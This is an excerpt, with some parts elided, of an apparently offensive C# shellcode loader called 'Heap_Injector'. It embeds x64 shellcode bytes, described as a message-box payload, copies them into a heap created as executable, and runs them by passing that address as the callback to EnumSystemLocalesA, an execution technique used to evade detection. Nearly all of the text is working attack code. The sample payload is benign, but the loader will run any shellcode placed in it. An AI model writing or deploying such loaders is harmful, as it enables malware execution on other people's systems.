...
namespace Heap_Injector
{
    class Program
    {
        // Remember to set correct architecture to your shellcode
        // For example: X64 shellcode that shows messagebox
        static byte[] buf = new byte[279] {0xfc,0x48,0x81,0xe4,0xf0,0xff,
            ...
            0x00,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x05,0x01,0x00,0x00,0x48,
            0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,
            0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x48,0x61,0x63,
            0x6b,0x65,0x64,0x00,0x48,0x61,0x63,0x6b,0x00};

        static void Main(string[] args)
        {
            IntPtr hHeap = API.HeapCreate(API.HEAP_CREATE_ENABLE_EXECUTE, UIntPtr.Zero, UIntPtr.Zero);
            Console.WriteLine("[>] Allocated Heap address - 0x{0}", hHeap.ToString("x2"));
            Marshal.Copy(buf, 0, hHeap, buf.Length);
            API.EnumSystemLocalesA(hHeap, 0);
    ...
    public class API
    {
        public static uint HEAP_CREATE_ENABLE_EXECUTE = 0x00040000;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool EnumSystemLocalesA(IntPtr lpLocaleEnumProc, int dwFlags);
